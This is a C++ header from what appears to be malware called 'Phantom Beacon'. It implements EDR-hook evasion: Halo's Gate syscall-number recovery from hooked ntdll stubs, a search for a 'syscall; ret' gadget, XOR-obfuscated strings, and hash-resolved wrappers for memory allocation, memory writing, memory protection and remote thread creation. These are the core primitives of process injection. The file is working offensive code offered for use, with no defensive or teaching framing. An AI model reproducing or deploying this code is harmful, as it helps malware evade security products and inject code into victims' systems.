#pragma once
// ============================================================================
//  syscalls.h — Phantom Beacon Indirect Syscalls
//  ──────────────────────────────────────────────
//  Bypasses user-mode hooks by executing syscalls indirectly.
//  Finds SSNs (System Service Numbers) dynamically from ntdll.dll.
// ============================================================================

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#include <vector>
#include <algorithm>
#include "evasion.h"

namespace syscalls {

struct SyscallEntry {
    uint32_t ssn;
    uintptr_t address;
};

// Halo's Gate: Find the SSN by looking at neighboring functions if the target is hooked
inline uint32_t find_ssn(uint8_t* pFunc) {
    if (!pFunc) return 0;

    // Standard syscall pattern:
    // mov r10, rcx
    // mov eax, SSN
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1 && pFunc[3] == 0xB8) {
        return *reinterpret_cast<uint32_t*>(pFunc + 4);
    }

    // If hooked (starts with JMP 0xE9), check neighbors (±32 bytes)
    if (pFunc[0] == 0xE9) {
        for (int i = 1; i <= 500; i++) {
            // Check neighbor "above"
            uint8_t* pNeighbor = pFunc + (i * 32);
            if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B && pNeighbor[2] == 0xD1 && pNeighbor[3] == 0xB8) {
                return *reinterpret_cast<uint32_t*>(pNeighbor + 4) - i;
            }
            // Check neighbor "below"
            pNeighbor = pFunc - (i * 32);
            if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B && pNeighbor[2] == 0xD1 && pNeighbor[3] == 0xB8) {
                return *reinterpret_cast<uint32_t*>(pNeighbor + 4) + i;
            }
        }
    }

    return 0;
}

// Find a 'syscall; ret' gadget in ntdll to use for indirect execution
inline uintptr_t find_syscall_gadget() {
    HMODULE hNtdll = peb::GetModuleByHash(peb::HASH_NTDLL);
    if (!hNtdll) return 0;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (!strcmp((char*)sectionHeader[i].Name, XOR_DEC(XOR_STR(".text")))) {
            uint8_t* pText = (uint8_t*)hNtdll + sectionHeader[i].VirtualAddress;
            for (DWORD j = 0; j < sectionHeader[i].Misc.VirtualSize - 2; j++) {
                if (pText[j] == 0x0F && pText[j+1] == 0x05 && pText[j+2] == 0xC3) {
                    return (uintptr_t)(pText + j);
                }
            }
        }
    }
    return 0;
}

// Global gadget address to avoid repeated searches
static uintptr_t g_syscall_gadget = 0;

// Simple wrapper using PEB resolution (Fallback when indirect syscalls are too noisy)
inline NTSTATUS call_peb_fallback(uint32_t moduleHash, uint32_t funcHash, PVOID arg1 = 0, PVOID arg2 = 0, PVOID arg3 = 0, PVOID arg4 = 0, PVOID arg5 = 0, PVOID arg6 = 0, PVOID arg7 = 0, PVOID arg8 = 0, PVOID arg9 = 0, PVOID arg10 = 0) {
    auto pFunc = peb::Resolve(moduleHash, funcHash);
    if (!pFunc) return 0xC0000001;
    
    typedef NTSTATUS (NTAPI *f_NtFunc)(PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID);
    return ((f_NtFunc)pFunc)(arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10);
}

// Wrapper for NtProtectVirtualMemory
inline NTSTATUS SysNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection) {
    return call_peb_fallback(peb::HASH_NTDLL, FN_NTPROTECTVIRTUALMEMORY, ProcessHandle, BaseAddress, NumberOfBytesToProtect, (PVOID)(ULONG_PTR)NewAccessProtection, OldAccessProtection);
}

// Wrapper for NtAllocateVirtualMemory
inline NTSTATUS SysNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    return call_peb_fallback(peb::HASH_NTDLL, FN_NTALLOCATEVIRTUALMEMORY, ProcessHandle, BaseAddress, (PVOID)ZeroBits, RegionSize, (PVOID)(ULONG_PTR)AllocationType, (PVOID)(ULONG_PTR)Protect);
}

// Wrapper for NtWriteVirtualMemory
inline NTSTATUS SysNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    return call_peb_fallback(peb::HASH_NTDLL, FN_NTWRITEVIRTUALMEMORY, ProcessHandle, BaseAddress, Buffer, (PVOID)NumberOfBytesToWrite, NumberOfBytesWritten);
}

// Wrapper for NtCreateThreadEx
inline NTSTATUS SysNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize, PVOID AttributeList) {
    return call_peb_fallback(peb::HASH_NTDLL, FN_NTCREATETHREADEX, ThreadHandle, (PVOID)(ULONG_PTR)DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, (PVOID)(ULONG_PTR)CreateFlags, (PVOID)ZeroBits, (PVOID)StackSize, (PVOID)MaxStackSize);
}

} // namespace syscalls
#endif
